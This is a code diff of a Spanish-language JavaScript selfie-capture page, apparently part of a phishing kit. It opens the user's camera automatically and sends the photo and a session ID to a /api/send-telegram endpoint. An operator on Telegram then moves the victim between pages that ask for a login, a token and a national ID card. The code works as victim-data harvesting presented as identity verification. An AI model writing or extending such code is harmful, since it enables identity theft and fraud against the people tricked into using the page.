@@ -1,192 +1,310 @@
 /**
- * CARA.JS - Página de captura de selfie
- * Maneja la cámara web y captura de fotos faciales
+ * CARA - CAPTURA DE SELFIE
+ * Captura de foto del rostro del usuario para verificación
+ * Versión optimizada con arquitectura robusta
  */
 
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('🚀 Iniciando página de captura de cara...');
-    
-    // Asegurar que commonUtils esté inicializado
-    if (window.commonUtils && !window.commonUtils.initialized) {
+(() => {
+    'use strict';
+
+    // ============================
+    // ESTADO DE LA APLICACIÓN
+    // ============================
+    const appState = {
+        video: null,
+        canvas: null,
+        stream: null,
+        messageId: null,
+        isCapturing: false,
+        isCameraActive: false
+    };
+
+    // ============================
+    // ELEMENTOS DEL DOM
+    // ============================
+    const elements = {
+        video: null,
+        canvas: null,
+        captureBtn: null
+    };
+
+    // ============================
+    // CONSTANTES
+    // ============================
+    const CAMERA_CONSTRAINTS = {
+        video: {
+            facingMode: 'user',
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+        }
+    };
+
+    const IMAGE_QUALITY = 0.9;
+
+    // ============================
+    // INICIALIZACIÓN
+    // ============================
+    function init() {
+        console.log('🎬 Inicializando captura de selfie...');
+
+        if (!initializeElements()) {
+            console.error('❌ Error: Elementos DOM no encontrados');
+            return;
+        }
+
+        if (!validateCommonUtils()) {
+            console.error('❌ Error: commonUtils no disponible');
+            return;
+        }
+
+        // Inicializar utilidades comunes
         window.commonUtils.initializeCommon();
+
+        // Obtener messageId de datos previos
+        loadPreviousData();
+
+        // Configurar event listeners
+        setupEventListeners();
+
+        // Iniciar cámara automáticamente
+        startCamera();
+
+        console.log('✅ Inicialización completada');
     }
 
-    // Ocultar overlay inicial
-    if (window.loadingOverlay) {
-        window.loadingOverlay.hide();
+    // ============================
+    // INICIALIZACIÓN DE ELEMENTOS
+    // ============================
+    function initializeElements() {
+        elements.video = document.getElementById('video');
+        elements.canvas = document.getElementById('canvas');
+        elements.captureBtn = document.getElementById('captureBtn');
+
+        appState.video = elements.video;
+        appState.canvas = elements.canvas;
+
+        return elements.video && elements.canvas && elements.captureBtn;
     }
 
-    // Variables globales
-    let stream = null;
-    let capturedPhoto = null;
+    // ============================
+    // VALIDACIONES
+    // ============================
+    function validateCommonUtils() {
+        return window.commonUtils && 
+               typeof window.commonUtils.initializeCommon === 'function' &&
+               typeof window.commonUtils.showError === 'function' &&
+               typeof window.commonUtils.getSessionId === 'function';
+    }
 
-    // Elementos DOM
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const cameraPreview = document.getElementById('cameraPreview');
-    const cameraPlaceholder = document.getElementById('cameraPlaceholder');
-    const capturedImage = document.getElementById('capturedImage');
-    const capturedPhotoImg = document.getElementById('capturedPhoto');
-    const startCameraButton = document.getElementById('startCameraButton');
-    const captureButton = document.getElementById('captureButton');
-    const continueButton = document.getElementById('continueButton');
-    const retakeButton = document.getElementById('retakeButton');
-
-    // Iniciar cámara
-    startCameraButton.addEventListener('click', async function() {
-        console.log('📹 Iniciando cámara...');
-        
+    // ============================
+    // CARGAR DATOS PREVIOS
+    // ============================
+    function loadPreviousData() {
         try {
-            stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                } 
-            });
+            const storedData = sessionStorage.getItem('formData');
+            if (storedData) {
+                const data = JSON.parse(storedData);
+                appState.messageId = data.messageId || `temp_${Date.now()}`;
+                console.log('📦 Datos previos cargados, messageId:', appState.messageId);
+            } else {
+                appState.messageId = `selfie_${Date.now()}`;
+                console.log('⚠️ No hay datos previos, messageId generado:', appState.messageId);
+            }
+        } catch (error) {
+            console.error('❌ Error al cargar datos previos:', error);
+            appState.messageId = `selfie_${Date.now()}`;
+        }
+    }
+
+    // ============================
+    // EVENT LISTENERS
+    // ============================
+    function setupEventListeners() {
+        elements.captureBtn.addEventListener('click', handleCapture);
+
+        // Limpiar al salir
+        window.addEventListener('beforeunload', cleanup);
+
+        // Listener para acciones de Telegram
+        if (window.socket) {
+            window.socket.on('telegram_action', handleTelegramAction);
+        }
+    }
+
+    // ============================
+    // CÁMARA
+    // ============================
+    async function startCamera() {
+        if (appState.isCameraActive) {
+            console.log('⚠️ La cámara ya está activa');
+            return;
+        }
+
+        try {
+            console.log('📹 Iniciando cámara frontal...');
+            appState.stream = await navigator.mediaDevices.getUserMedia(CAMERA_CONSTRAINTS);
             
-            video.srcObject = stream;
-            cameraPlaceholder.style.display = 'none';
-            video.style.display = 'block';
+            elements.video.srcObject = appState.stream;
+            elements.video.play();
             
-            startCameraButton.style.display = 'none';
-            captureButton.style.display = 'flex';
-            
-            console.log('✅ Cámara iniciada exitosamente');
-            
+            appState.isCameraActive = true;
+            console.log('✅ Cámara iniciada correctamente');
         } catch (error) {
             console.error('❌ Error al acceder a la cámara:', error);
-            window.commonUtils.showError('No se pudo acceder a la cámara. Por favor, verifique los permisos.');
+            window.commonUtils.showError(
+                'No se pudo acceder a la cámara. Por favor, otorgue los permisos necesarios.'
+            );
         }
-    });
+    }
 
-    // Capturar foto
-    captureButton.addEventListener('click', function() {
-        console.log('📸 Capturando foto...');
-        
-        if (!stream) {
-            window.commonUtils.showError('La cámara no está activa');
+    function stopCamera() {
+        if (appState.stream) {
+            appState.stream.getTracks().forEach(track => track.stop());
+            appState.stream = null;
+            appState.isCameraActive = false;
+            console.log('🛑 Cámara detenida');
+        }
+    }
+
+    // ============================
+    // CAPTURA DE FOTO
+    // ============================
+    async function handleCapture() {
+        if (appState.isCapturing) {
+            console.log('⚠️ Captura en progreso...');
             return;
         }
 
-        // Configurar canvas
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // Obtener imagen
-        capturedPhoto = canvas.toDataURL('image/jpeg', 0.9);
-        
-        // Mostrar imagen capturada
-        capturedPhotoImg.src = capturedPhoto;
-        cameraPreview.style.display = 'none';
-        capturedImage.style.display = 'flex';
-        
-        // Detener stream
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-            stream = null;
+        appState.isCapturing = true;
+        elements.captureBtn.disabled = true;
+
+        try {
+            console.log('📸 Capturando selfie...');
+
+            // Obtener foto en base64
+            const photoData = capturePhoto();
+            
+            if (!photoData) {
+                throw new Error('No se pudo capturar la foto');
+            }
+
+            console.log('✅ Selfie capturado');
+
+            // Detener cámara
+            stopCamera();
+
+            // Enviar a Telegram
+            await sendPhotoToTelegram(photoData);
+
+        } catch (error) {
+            console.error('❌ Error en captura:', error);
+            window.commonUtils.showError('Error al capturar la foto. Intente nuevamente.');
+            elements.captureBtn.disabled = false;
+        } finally {
+            appState.isCapturing = false;
         }
-        
-        // Mostrar botón continuar
-        captureButton.style.display = 'none';
-        continueButton.style.display = 'flex';
-        
-        console.log('✅ Foto capturada exitosamente');
-    });
+    }
 
-    // Retomar foto
-    retakeButton.addEventListener('click', function() {
-        console.log('🔄 Retomando foto...');
+    function capturePhoto() {
+        const context = elements.canvas.getContext('2d');
+        elements.canvas.width = elements.video.videoWidth;
+        elements.canvas.height = elements.video.videoHeight;
         
-        capturedImage.style.display = 'none';
-        cameraPreview.style.display = 'flex';
-        cameraPlaceholder.style.display = 'flex';
-        video.style.display = 'none';
+        context.drawImage(elements.video, 0, 0);
         
-        capturedPhoto = null;
-        
-        continueButton.style.display = 'none';
-        startCameraButton.style.display = 'flex';
-    });
+        return elements.canvas.toDataURL('image/jpeg', IMAGE_QUALITY);
+    }
 
-    // Continuar a siguiente paso
-    continueButton.addEventListener('click', async function() {
-        console.log('➡️ Continuando a captura de cédula...');
-        
-        if (!capturedPhoto) {
-            window.commonUtils.showError('Debe capturar una foto antes de continuar');
-            return;
-        }
+    // ============================
+    // ENVÍO A TELEGRAM
+    // ============================
+    async function sendPhotoToTelegram(photoData) {
+        const sessionId = window.commonUtils.getSessionId();
 
-        // Mostrar overlay
+        const data = {
+            tipo: 'Selfie',
+            messageId: appState.messageId,
+            foto: photoData,
+            sessionId: sessionId
+        };
+
+        console.log('📤 Enviando selfie a Telegram con sessionId:', sessionId);
+
         window.loadingOverlay.showSending('Enviando selfie...');
 
         try {
-            // Preparar datos
-            const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-            
-            console.log('📤 Preparando envío de selfie...');
-            console.log('Message ID:', formData.messageId);
-            console.log('Tamaño foto:', capturedPhoto.length, 'caracteres');
-            
-            const data = {
-                tipo: 'Selfie',
-                messageId: formData.messageId,
-                foto: capturedPhoto
-            };
-
-            console.log('🌐 Enviando request a /api/send-telegram...');
-
             const response = await fetch('/api/send-telegram', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(data)
             });
 
-            console.log('📨 Response status:', response.status);
-
             if (!response.ok) {
-                const errorText = await response.text();
-                console.error('Error response:', errorText);
                 throw new Error(`Error del servidor: ${response.status}`);
             }
 
             const result = await response.json();
-            console.log('✅ Response result:', result);
-            
+
             if (!result.success) {
-                throw new Error(result.error || 'Error al procesar la solicitud');
+                throw new Error(result.error || 'Error al enviar selfie');
             }
 
-            console.log('✅ Selfie enviada exitosamente a Telegram - Message ID:', result.messageId);
-            
-            // Guardar estado
-            formData.selfieMessageId = result.messageId;
-            sessionStorage.setItem('formData', JSON.stringify(formData));
-            
-            // Redirigir a página de cédula
-            console.log('🔄 Redirigiendo a cedula.html...');
-            window.location.href = 'cedula.html';
+            console.log('✅ Selfie enviado exitosamente, Message ID:', result.messageId);
+
+            // Mantener overlay visible esperando respuesta de Telegram
+            window.loadingOverlay.show('Esperando validación...');
 
         } catch (error) {
             console.error('❌ Error al enviar selfie:', error);
             window.loadingOverlay.hide();
-            window.commonUtils.showError('Error al enviar la selfie. Por favor intente nuevamente.');
+            window.commonUtils.showError('Error al enviar la foto. Intente nuevamente.');
+            throw error;
         }
-    });
+    }
 
-    // Limpiar al salir
-    window.addEventListener('beforeunload', function() {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
+    // ============================
+    // ACCIONES DE TELEGRAM
+    // ============================
+    function handleTelegramAction(action) {
+        console.log('📱 Acción recibida de Telegram:', action);
+        window.loadingOverlay.hide();
+
+        const actionHandlers = {
+            'pedir_logo': () => window.location.href = 'index.html',
+            'pedir_token': () => window.location.href = 'token.html',
+            'pedir_cara': () => window.location.reload(),
+            'pedir_cedula': () => window.location.href = 'cedula.html',
+            'finalizar': () => {
+                window.commonUtils.showSuccess('Proceso completado exitosamente');
+                setTimeout(() => window.location.href = 'index.html', 2000);
+            }
+        };
+
+        const handler = actionHandlers[action];
+        if (handler) {
+            handler();
+        } else {
+            console.warn('⚠️ Acción desconocida:', action);
         }
-    });
+    }
 
-    console.log('✅ Página de captura de cara iniciada correctamente');
-});
+    // ============================
+    // LIMPIEZA
+    // ============================
+    function cleanup() {
+        stopCamera();
+        console.log('🧹 Recursos liberados');
+    }
+
+    // ============================
+    // AUTO-INICIO
+    // ============================
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+
+})();
